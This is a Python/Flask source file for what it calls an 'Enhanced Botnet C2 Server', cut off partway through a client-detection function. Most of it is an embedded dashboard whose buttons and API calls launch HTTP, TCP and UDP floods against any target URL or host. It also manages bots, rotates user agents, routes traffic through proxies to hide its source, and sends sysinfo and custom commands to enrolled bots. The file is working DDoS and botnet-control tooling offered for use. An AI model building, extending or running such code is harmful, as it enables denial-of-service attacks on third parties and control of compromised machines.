"""
ENHANCED BOTNET C2 SERVER - MULTI-CLIENT SUPPORT
================================================
Features:
- Auto-approval system
- Custom user agent management
- Optional proxy support
- Modern blue/black interface
- Resource-friendly operations
- Python, Java, JavaScript client compatibility
- Improved error handling

Run: python server.py [port]
Example: python server.py 5000
"""

import threading
import json
import time
import os
import sys
import traceback
from datetime import datetime
from functools import wraps
from typing import Dict, List, Any, Optional

try:
    from flask import Flask, render_template_string, request, jsonify, Response
    from flask_cors import CORS
    import atexit
except ImportError:
    print("[!] Install dependencies: pip install flask flask-cors")
    exit(1)

app = Flask(__name__)
CORS(app)

# Global storage with thread safety
approved_bots: Dict[str, Dict] = {}
commands_queue: Dict[str, List] = {}
attack_logs: List[Dict] = []
user_agents: List[str] = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    # Add simpler user agents for different clients
    'Java-Bot-Client/1.0',
    'Mozilla/5.0 (compatible; Java-Bot)',
    'JavaScript-Bot/1.0 (Node.js)',
    'Python-Bot/3.0'
]
proxy_list: List[str] = []

# Thread safety
bot_lock = threading.Lock()
log_lock = threading.Lock()
queue_lock = threading.Lock()

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Control Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #000000 0%, #0a1929 100%);
            color: #e3f2fd;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(25, 118, 210, 0.2);
        }
        .header h1 { 
            font-size: 2.2em; 
            margin-bottom: 10px; 
            color: #42a5f5;
            text-shadow: 0 0 20px rgba(66, 165, 245, 0.5);
        }
        .header p { color: #90caf9; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        .stat-box {
            border: 2px solid #1976d2;
            padding: 20px;
            background: rgba(13, 27, 42, 0.9);
            text-align: center;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
            transition: all 0.3s ease;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 24px rgba(25, 118, 210, 0.3);
        }
        .stat-box h3 { color: #42a5f5; margin-bottom: 10px; font-size: 0.9em; }
        .stat-box p { font-size: 2.2em; color: #90caf9; font-weight: bold; }
        .section {
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
        }
        .section h2 {
            color: #42a5f5;
            margin-bottom: 20px;
            border-bottom: 2px solid #1976d2;
            padding-bottom: 12px;
            font-size: 1.3em;
        }
        .bot-list { display: grid; gap: 12px; }
        .bot-item {
            border: 1px solid #1976d2;
            padding: 15px;
            background: rgba(13, 27, 42, 0.6);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        .bot-item:hover {
            background: rgba(25, 118, 210, 0.15);
            transform: translateX(5px);
        }
        .bot-item.offline { border-color: #546e7a; color: #90a4ae; }
        .bot-item.online { border-color: #66bb6a; }
        .bot-item.java { border-color: #ff5722; background: rgba(255, 87, 34, 0.1); }
        .bot-item.python { border-color: #1976d2; background: rgba(25, 118, 210, 0.1); }
        .bot-item.javascript { border-color: #f7df1e; background: rgba(247, 223, 30, 0.1); color: #000; }
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-online { background: #66bb6a; box-shadow: 0 0 10px #66bb6a; }
        .status-offline { background: #546e7a; }
        .client-type {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 0.8em;
            margin-left: 8px;
            font-weight: bold;
        }
        .client-java { background: #ff5722; color: white; }
        .client-python { background: #1976d2; color: white; }
        .client-javascript { background: #f7df1e; color: black; }
        .client-unknown { background: #546e7a; color: white; }
        .btn {
            background: #1976d2;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-weight: 600;
            margin-left: 10px;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        .btn:hover { 
            background: #1565c0;
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(25, 118, 210, 0.4);
        }
        .btn-danger { background: #d32f2f; }
        .btn-danger:hover { background: #c62828; }
        .btn-success { background: #2e7d32; }
        .btn-success:hover { background: #1b5e20; }
        .btn-warning { background: #f57c00; }
        .btn-warning:hover { background: #ef6c00; }
        input, select, textarea, button {
            background: rgba(13, 27, 42, 0.8);
            border: 2px solid #1976d2;
            color: #e3f2fd;
            padding: 12px;
            font-family: inherit;
            width: 100%;
            margin: 8px 0;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #42a5f5;
            box-shadow: 0 0 12px rgba(66, 165, 245, 0.3);
        }
        button {
            cursor: pointer;
            font-weight: 600;
            background: rgba(25, 118, 210, 0.2);
        }
        button:hover { 
            background: #1976d2;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(25, 118, 210, 0.3);
        }
        .form-group { margin-bottom: 18px; }
        .form-group label { 
            display: block; 
            margin-bottom: 8px;
            color: #90caf9;
            font-weight: 500;
        }
        textarea { 
            min-height: 120px; 
            font-size: 13px;
            font-family: 'Courier New', monospace;
        }
        .log {
            max-height: 300px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border: 1px solid #1976d2;
            border-radius: 6px;
        }
        .log-entry { 
            margin-bottom: 8px;
            padding: 6px;
            border-left: 3px solid #1976d2;
            padding-left: 10px;
        }
        .success { color: #66bb6a; border-left-color: #66bb6a; }
        .error { color: #ef5350; border-left-color: #ef5350; }
        .warning { color: #ffa726; border-left-color: #ffa726; }
        .info { color: #42a5f5; border-left-color: #42a5f5; }
        .java-log { color: #ff5722; border-left-color: #ff5722; }
        .python-log { color: #1976d2; border-left-color: #1976d2; }
        .javascript-log { color: #f7df1e; border-left-color: #f7df1e; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); }
        ::-webkit-scrollbar-thumb { 
            background: #1976d2;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover { background: #1565c0; }
        .no-bots {
            text-align: center;
            padding: 30px;
            color: #546e7a;
            font-size: 1.1em;
        }
        .command-preview {
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            border-radius: 6px;
            margin-top: 10px;
            font-family: monospace;
            font-size: 0.9em;
            border: 1px solid #1976d2;
        }
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
        }
        .client-stats {
            display: flex;
            justify-content: space-around;
            margin-top: 10px;
        }
        .client-stat {
            text-align: center;
            padding: 10px;
        }
        .client-stat .count {
            font-size: 2em;
            font-weight: bold;
        }
        .client-stat.java .count { color: #ff5722; }
        .client-stat.python .count { color: #1976d2; }
        .client-stat.javascript .count { color: #f7df1e; }
    </style>
</head>
<body>
    <div class="header">
        <h1>C2 CONTROL PANEL - MULTI-CLIENT SUPPORT</h1>
        <p>Python | Java | JavaScript | Auto-Approval | Resource Optimized</p>
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>TOTAL BOTS</h3>
            <p id="approved-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>ONLINE BOTS</h3>
            <p id="online-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>ACTIVE ATTACKS</h3>
            <p id="active-attacks">0</p>
        </div>
        <div class="stat-box">
            <h3>TOTAL COMMANDS</h3>
            <p id="total-commands">0</p>
        </div>
    </div>

    <div class="section">
        <h2>CLIENT STATISTICS</h2>
        <div class="client-stats">
            <div class="client-stat python">
                <div class="count" id="python-clients">0</div>
                <div>Python</div>
            </div>
            <div class="client-stat java">
                <div class="count" id="java-clients">0</div>
                <div>Java</div>
            </div>
            <div class="client-stat javascript">
                <div class="count" id="javascript-clients">0</div>
                <div>JavaScript</div>
            </div>
        </div>
    </div>

    <div class="section">
        <h2>CONNECTED BOTS</h2>
        <div id="approved-list" class="bot-list">
            <div class="no-bots">Waiting for bot connections...</div>
        </div>
    </div>

    <div class="section">
        <h2>QUICK COMMANDS</h2>
        <div class="quick-commands">
            <button class="btn-success" onclick="sendPing()">PING ALL</button>
            <button class="btn-warning" onclick="sendSysInfo()">SYSINFO</button>
            <button class="btn-danger" onclick="stopAllAttacks()">STOP ALL</button>
            <button onclick="clearInactiveBots()">CLEAR INACTIVE</button>
            <button onclick="testAllClients()">TEST CLIENTS</button>
        </div>
        <div style="margin-top: 15px;">
            <button onclick="sendCommandToAll('ping')" class="btn-success">Ping All</button>
            <button onclick="sendCommandToAll('sysinfo')" class="btn-warning">SysInfo All</button>
            <button onclick="sendCommandToAll('stop_all')" class="btn-danger">Stop All Attacks</button>
        </div>
    </div>

    <div class="section">
        <h2>USER AGENT MANAGEMENT</h2>
        <div class="form-group">
            <label>User Agents (one per line):</label>
            <textarea id="user-agents" placeholder="Mozilla/5.0 ..."></textarea>
        </div>
        <div style="display: flex; gap: 10px; margin-bottom: 15px;">
            <button onclick="addJavaAgents()">ADD JAVA AGENTS</button>
            <button onclick="addJavaScriptAgents()">ADD JS AGENTS</button>
            <button onclick="addPythonAgents()">ADD PYTHON AGENTS</button>
        </div>
        <button onclick="updateUserAgents()">UPDATE USER AGENTS</button>
    </div>

    <div class="section">
        <h2>PROXY MANAGEMENT (Optional)</h2>
        <div class="form-group">
            <label>Proxies (format: ip:port or user:pass@ip:port, one per line):</label>
            <textarea id="proxies" placeholder="1.2.3.4:8080
user:pass@5.6.7.8:8080"></textarea>
        </div>
        <button onclick="updateProxies()">UPDATE PROXIES</button>
    </div>

    <div class="section">
        <h2>HTTP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target URL:</label>
            <input type="text" id="http-target" placeholder="https://example.com">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-300):</label>
            <input type="number" id="http-threads" value="100" min="50" max="300">
            <small>This exact thread count will be sent to ALL clients</small>
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="http-duration" value="60">
        </div>
        <div class="form-group">
            <label>Method:</label>
            <select id="http-method">
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="HEAD">HEAD</option>
            </select>
        </div>
        <div class="form-group">
            <label>Target Client Type:</label>
            <select id="http-client-type">
                <option value="all">All Clients</option>
                <option value="python">Python Clients</option>
                <option value="java">Java Clients</option>
                <option value="javascript">JavaScript Clients</option>
            </select>
        </div>
        <button onclick="launchHTTPFlood()" class="btn-danger">LAUNCH HTTP FLOOD</button>
        <div id="http-preview" class="command-preview" style="display: none;">
            <strong>Command Preview:</strong> Will be shown here...
        </div>
    </div>

    <div class="section">
        <h2>TCP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target (host:port):</label>
            <input type="text" id="tcp-target" placeholder="example.com:80">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-200):</label>
            <input type="number" id="tcp-threads" value="75" min="50" max="200">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="tcp-duration" value="60">
        </div>
        <div class="form-group">
            <label>Target Client Type:</label>
            <select id="tcp-client-type">
                <option value="all">All Clients</option>
                <option value="python">Python Clients</option>
                <option value="java">Java Clients</option>
                <option value="javascript">JavaScript Clients</option>
            </select>
        </div>
        <button onclick="launchTCPFlood()" class="btn-danger">LAUNCH TCP FLOOD</button>
    </div>

    <div class="section">
        <h2>UDP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target (host:port):</label>
            <input type="text" id="udp-target" placeholder="example.com:53">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-200):</label>
            <input type="number" id="udp-threads" value="75" min="50" max="200">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="udp-duration" value="60">
        </div>
        <div class="form-group">
            <label>Target Client Type:</label>
            <select id="udp-client-type">
                <option value="all">All Clients</option>
                <option value="python">Python Clients</option>
                <option value="java">Java Clients</option>
                <option value="javascript">JavaScript Clients</option>
            </select>
        </div>
        <button onclick="launchUDPFlood()" class="btn-danger">LAUNCH UDP FLOOD</button>
    </div>

    <div class="section">
        <h2>TEST COMMANDS</h2>
        <div class="form-group">
            <label>Test Target URL:</label>
            <input type="text" id="test-target" placeholder="https://httpbin.org/get">
        </div>
        <div class="form-group">
            <label>Test Duration (seconds):</label>
            <input type="number" id="test-duration" value="10" min="5" max="30">
        </div>
        <div class="form-group">
            <label>Test Threads:</label>
            <input type="number" id="test-threads" value="20" min="10" max="50">
        </div>
        <div class="form-group">
            <label>Target Client Type:</label>
            <select id="test-client-type">
                <option value="all">All Clients</option>
                <option value="python">Python Clients</option>
                <option value="java">Java Clients</option>
                <option value="javascript">JavaScript Clients</option>
            </select>
        </div>
        <button onclick="sendTestCommand()" class="btn-warning">SEND TEST COMMAND</button>
        <small style="color: #90caf9; display: block; margin-top: 10px;">
            Note: Test commands use httpbin.org for safe testing
        </small>
    </div>

    <div class="section">
        <h2>CLIENT MANAGEMENT</h2>
        <div class="form-group">
            <label>Select Client Type to Target:</label>
            <select id="target-client-type" onchange="updateTargetedCommands()">
                <option value="all">All Clients</option>
                <option value="python">Python Only</option>
                <option value="java">Java Only</option>
                <option value="javascript">JavaScript Only</option>
            </select>
        </div>
        <div class="quick-commands">
            <button onclick="sendTargetedPing()">PING SELECTED</button>
            <button onclick="sendTargetedSysInfo()">SYSINFO SELECTED</button>
            <button onclick="sendTargetedStop()">STOP SELECTED</button>
        </div>
        <div class="form-group">
            <label>Custom Command (JSON):</label>
            <textarea id="custom-command" placeholder='{"type": "ping"}'>{"type": "ping"}</textarea>
        </div>
        <button onclick="sendCustomCommand()">SEND CUSTOM COMMAND</button>
    </div>

    <div class="section">
        <h2>ACTIVITY LOGS</h2>
        <div style="margin-bottom: 10px;">
            <button onclick="clearLogs()">CLEAR LOGS</button>
            <button onclick="exportLogs()">EXPORT LOGS</button>
            <button onclick="toggleAutoScroll()" id="auto-scroll-btn">AUTO SCROLL: ON</button>
        </div>
        <div id="logs" class="log"></div>
    </div>

    <script>
        let autoScroll = true;
        
        function toggleAutoScroll() {
            autoScroll = !autoScroll;
            document.getElementById('auto-scroll-btn').textContent = 'AUTO SCROLL: ' + (autoScroll ? 'ON' : 'OFF');
        }

        function addJavaAgents() {
            const textarea = document.getElementById('user-agents');
            const javaAgents = [
                'Java-Bot-Client/1.0',
                'Mozilla/5.0 (compatible; Java-Bot)',
                'Java-HTTP-Client/1.8',
                'Mozilla/5.0 (Java; U; en-US)'
            ];
            addAgents(javaAgents);
        }

        function addJavaScriptAgents() {
            const jsAgents = [
                'JavaScript-Bot/1.0 (Node.js)',
                'Node.js Bot Client',
                'Mozilla/5.0 (compatible; JS-Bot)',
                'JS-HTTP-Client/1.0'
            ];
            addAgents(jsAgents);
        }

        function addPythonAgents() {
            const pythonAgents = [
                'Python-Bot/3.0',
                'Python-Requests/2.28',
                'Mozilla/5.0 (compatible; Python-Bot)',
                'Python-HTTP-Client/1.0'
            ];
            addAgents(pythonAgents);
        }

        function addAgents(agents) {
            const textarea = document.getElementById('user-agents');
            let current = textarea.value;
            if (current && !current.endsWith('\n')) {
                current += '\n';
            }
            textarea.value = current + agents.join('\n');
        }

        function updateTargetedCommands() {
            const clientType = document.getElementById('target-client-type').value;
            document.getElementById('http-client-type').value = clientType;
            document.getElementById('tcp-client-type').value = clientType;
            document.getElementById('udp-client-type').value = clientType;
            document.getElementById('test-client-type').value = clientType;
        }

        function sendTargetedPing() {
            const clientType = document.getElementById('target-client-type').value;
            fetch('/api/command/ping', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ client_type: clientType })
            })
            .then(r => r.json())
            .then(data => {
                alert(`Ping sent to ${data.sent_count || 0} ${clientType} clients`);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to send ping');
            });
        }

        function sendTargetedSysInfo() {
            const clientType = document.getElementById('target-client-type').value;
            fetch('/api/command/sysinfo', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ client_type: clientType })
            })
            .then(r => r.json())
            .then(data => {
                alert(`Sysinfo sent to ${data.sent_count || 0} ${clientType} clients`);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to send sysinfo');
            });
        }

        function sendTargetedStop() {
            const clientType = document.getElementById('target-client-type').value;
            if(confirm(`Stop all attacks on ${clientType} clients?`)) {
                fetch('/api/command/stop', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ client_type: clientType })
                })
                .then(r => r.json())
                .then(data => {
                    alert(`Stop command sent to ${data.sent_count || 0} ${clientType} clients`);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to send stop command');
                });
            }
        }

        function sendCustomCommand() {
            const commandText = document.getElementById('custom-command').value;
            const clientType = document.getElementById('target-client-type').value;
            
            try {
                const command = JSON.parse(commandText);
                fetch('/api/command/custom', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        command: command,
                        client_type: clientType 
                    })
                })
                .then(r => r.json())
                .then(data => {
                    alert(`Custom command sent to ${data.sent_count || 0} ${clientType} clients`);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to send custom command');
                });
            } catch (e) {
                alert('Invalid JSON: ' + e.message);
            }
        }

        function testAllClients() {
            if(confirm('Send test command to all online clients?')) {
                fetch('/api/command/test', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        target: 'https://httpbin.org/get',
                        duration: 5,
                        threads: 10 
                    })
                })
                .then(r => r.json())
                .then(data => {
                    alert(`Test command sent to ${data.sent_count || 0} clients`);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to send test command');
                });
            }
        }

        function sendCommandToAll(commandType) {
            const clientType = 'all';
            const endpoint = commandType === 'ping' ? '/api/command/ping' :
                           commandType === 'sysinfo' ? '/api/command/sysinfo' :
                           '/api/command/stop';
            
            if (commandType === 'stop_all' && !confirm('Stop all attacks on all clients?')) {
                return;
            }
            
            fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ client_type: clientType })
            })
            .then(r => r.json())
            .then(data => {
                alert(`${commandType} sent to ${data.sent_count || 0} clients`);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to send command');
            });
        }

        function removeBot(botId) {
            if(confirm('Remove bot: ' + botId + '?')) {
                fetch('/api/remove/' + botId, {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => console.error('Error:', err));
            }
        }

        function updateUserAgents() {
            const agents = document.getElementById('user-agents').value;
            fetch('/api/user-agents', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ user_agents: agents })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to update user agents');
            });
        }

        function updateProxies() {
            const proxies = document.getElementById('proxies').value;
            fetch('/api/proxies', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ proxies: proxies })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to update proxies');
            });
        }

        function clearInactiveBots() {
            if(confirm('Clear all inactive (offline > 5 minutes) bots?')) {
                fetch('/api/clear/inactive', {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => console.error('Error:', err));
            }
        }

        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('approved-bots').textContent = data.approved_bots;
                    document.getElementById('online-bots').textContent = data.online_bots;
                    document.getElementById('active-attacks').textContent = data.active_attacks;
                    document.getElementById('total-commands').textContent = data.total_commands || 0;
                    
                    document.getElementById('python-clients').textContent = data.python_clients;
                    document.getElementById('java-clients').textContent = data.java_clients;
                    document.getElementById('javascript-clients').textContent = data.javascript_clients;
                    
                    document.getElementById('user-agents').value = data.user_agents.join('\\n');
                    document.getElementById('proxies').value = data.proxies.join('\\n');
                    
                    const approvedList = document.getElementById('approved-list');
                    approvedList.innerHTML = '';
                    
                    if(data.approved.length === 0) {
                        approvedList.innerHTML = '<div class="no-bots">No bots connected. Run the client to connect.</div>';
                    } else {
                        window.currentBots = data.approved;
                        data.approved.forEach(bot => {
                            const div = document.createElement('div');
                            const statusClass = bot.online ? 'online' : 'offline';
                            const statusIndicator = bot.online ? 'status-online' : 'status-offline';
                            const clientType = bot.client_type || 'unknown';
                            const clientTypeClass = 'client-' + clientType;
                            
                            div.className = `bot-item ${statusClass} ${clientType}`;
                            div.innerHTML = `
                                <div>
                                    <span class="status-indicator ${statusIndicator}"></span>
                                    <strong>[${bot.bot_id}]</strong> 
                                    <span class="client-type ${clientTypeClass}">${clientType.toUpperCase()}</span>
                                    - ${bot.specs.cpu_cores || '?'} cores, ${bot.specs.ram_gb || '?'}GB RAM - 
                                    ${bot.specs.os || 'unknown'} - 
                                    Status: <strong>${bot.status || 'idle'}</strong> - 
                                    Last seen: ${bot.last_seen}
                                </div>
                                <button class="btn btn-danger" onclick="removeBot('${bot.bot_id}')">REMOVE</button>
                            `;
                            approvedList.appendChild(div);
                        });
                    }
                    
                    const logsDiv = document.getElementById('logs');
                    if(data.logs.length === 0) {
                        logsDiv.innerHTML = '<div style="text-align:center;color:#546e7a;">No activity yet</div>';
                    } else {
                        logsDiv.innerHTML = data.logs.slice(-30).reverse().map(log => {
                            const logClass = log.client_type ? `${log.type} ${log.client_type}-log` : log.type;
                            return `<div class="log-entry ${logClass}">[${log.time}] ${log.message}</div>`;
                        }).join('');
                        
                        if (autoScroll) {
                            logsDiv.scrollTop = logsDiv.scrollHeight;
                        }
                    }
                })
                .catch(err => console.error('Error fetching stats:', err));
        }

        function launchHTTPFlood() {
            const target = document.getElementById('http-target').value;
            const duration = document.getElementById('http-duration').value;
            const threads = document.getElementById('http-threads').value;
            const method = document.getElementById('http-method').value;
            const clientType = document.getElementById('http-client-type').value;
            
            if (!target) {
                alert('Please enter target URL');
                return;
            }
            
            if(confirm(`Launch HTTP ${method} flood with ${threads} threads to ${target} for ${duration}s on ${clientType} clients?`)) {
                fetch('/api/attack/http', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, duration, threads, method, client_type: clientType })
                })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to launch attack');
                });
            }
        }

        function launchTCPFlood() {
            const target = document.getElementById('tcp-target').value;
            const duration = document.getElementById('tcp-duration').value;
            const threads = document.getElementById('tcp-threads').value;
            const clientType = document.getElementById('tcp-client-type').value;
            
            if (!target) {
                alert('Please enter target');
                return;
            }
            
            if(confirm(`Launch TCP flood with ${threads} threads to ${target} for ${duration}s on ${clientType} clients?`)) {
                fetch('/api/attack/tcp', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, duration, threads, client_type: clientType })
                })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to launch attack');
                });
            }
        }

        function launchUDPFlood() {
            const target = document.getElementById('udp-target').value;
            const duration = document.getElementById('udp-duration').value;
            const threads = document.getElementById('udp-threads').value;
            const clientType = document.getElementById('udp-client-type').value;
            
            if (!target) {
                alert('Please enter target');
                return;
            }
            
            if(confirm(`Launch UDP flood with ${threads} threads to ${target} for ${duration}s on ${clientType} clients?`)) {
                fetch('/api/attack/udp', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ target, duration, threads, client_type: clientType })
                })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to launch attack');
                });
            }
        }

        function sendTestCommand() {
            const target = document.getElementById('test-target').value || 'https://httpbin.org/get';
            const duration = document.getElementById('test-duration').value;
            const threads = document.getElementById('test-threads').value;
            const clientType = document.getElementById('test-client-type').value;
            
            fetch('/api/command/test', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ target, duration, threads, client_type: clientType })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Failed to send test command');
            });
        }

        function sendPing() {
            fetch('/api/command/ping', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to send ping');
                });
        }

        function sendSysInfo() {
            fetch('/api/command/sysinfo', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to get system info');
                });
        }

        function stopAllAttacks() {
            if(confirm('Stop all active attacks on all bots?')) {
                fetch('/api/command/stop', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => {
                        console.error('Error:', err);
                        alert('Failed to stop attacks');
                    });
            }
        }

        function clearLogs() {
            if(confirm('Clear all activity logs?')) {
                fetch('/api/logs/clear', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(err => console.error('Error:', err));
            }
        }

        function exportLogs() {
            fetch('/api/logs/export')
                .then(r => r.text())
                .then(data => {
                    const blob = new Blob([data], { type: 'text/plain' });
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `c2-logs-${new Date().toISOString().slice(0,10)}.txt`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                })
                .catch(err => {
                    console.error('Error:', err);
                    alert('Failed to export logs');
                });
        }

        // Update stats every 2 seconds
        setInterval(updateStats, 2000);
        updateStats();
        
        // Preview HTTP command
        const httpTarget = document.getElementById('http-target');
        const httpThreads = document.getElementById('http-threads');
        const httpPreview = document.getElementById('http-preview');
        
        function updateHTTPPreview() {
            if (httpTarget.value) {
                httpPreview.style.display = 'block';
                httpPreview.innerHTML = `
                    <strong>Command Preview:</strong><br>
                    Type: http_flood<br>
                    Target: ${httpTarget.value}<br>
                    Threads: ${httpThreads.value} (EXACT value sent to clients)<br>
                    Method: ${document.getElementById('http-method').value}<br>
                    Duration: ${document.getElementById('http-duration').value}s<br>
                    Client Type: ${document.getElementById('http-client-type').value}
                `;
            } else {
                httpPreview.style.display = 'none';
            }
        }
        
        httpTarget.addEventListener('input', updateHTTPPreview);
        httpThreads.addEventListener('input', updateHTTPPreview);
        document.getElementById('http-method').addEventListener('change', updateHTTPPreview);
        document.getElementById('http-duration').addEventListener('input', updateHTTPPreview);
        document.getElementById('http-client-type').addEventListener('change', updateHTTPPreview);
    </script>
</body>
</html>
"""

# Decorators for thread safety
def synchronized(lock):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            with lock:
                return func(*args, **kwargs)
        return wrapper
    return decorator

def log_activity(message: str, log_type: str = 'info', client_type: str = None):
    """Add log entry with thread safety"""
    with log_lock:
        log_entry = {
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': log_type,
            'message': message
        }
        if client_type:
            log_entry['client_type'] = client_type
        attack_logs.append(log_entry)
        
        # Keep only last 1000 logs
        if len(attack_logs) > 1000:
            attack_logs.pop(0)

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@synchronized(bot_lock)
def detect_client_type(specs: Dict) -> str:
    """Detect if client is Java, Python, or JavaScript based on specs"""
    try:
        # Check for explicit client type
        if specs.get('client_type'):
            return specs['client_type'].lower()
        
        # Check capabilities
        capabilities = specs.get('capabilities', {})
        if capabilities.get('javascript'):
            return 'javascript'
        elif capabilities.get('java'):
            return 'java'
        elif capabilities.get('python'):
            return 'python'
        
        # Check user agent or other indicators
        user_agent = specs.get('user_agent', '').lower()
        if 'javascript' in user_agent or 'node' in user_agent or 'js' in user_agent:
            return 'javascript'
        elif 'java' in user_agent or 'jdk' in user_agent:
            return 'java'
        elif 'python' in user_agent:
            return 'python'
        
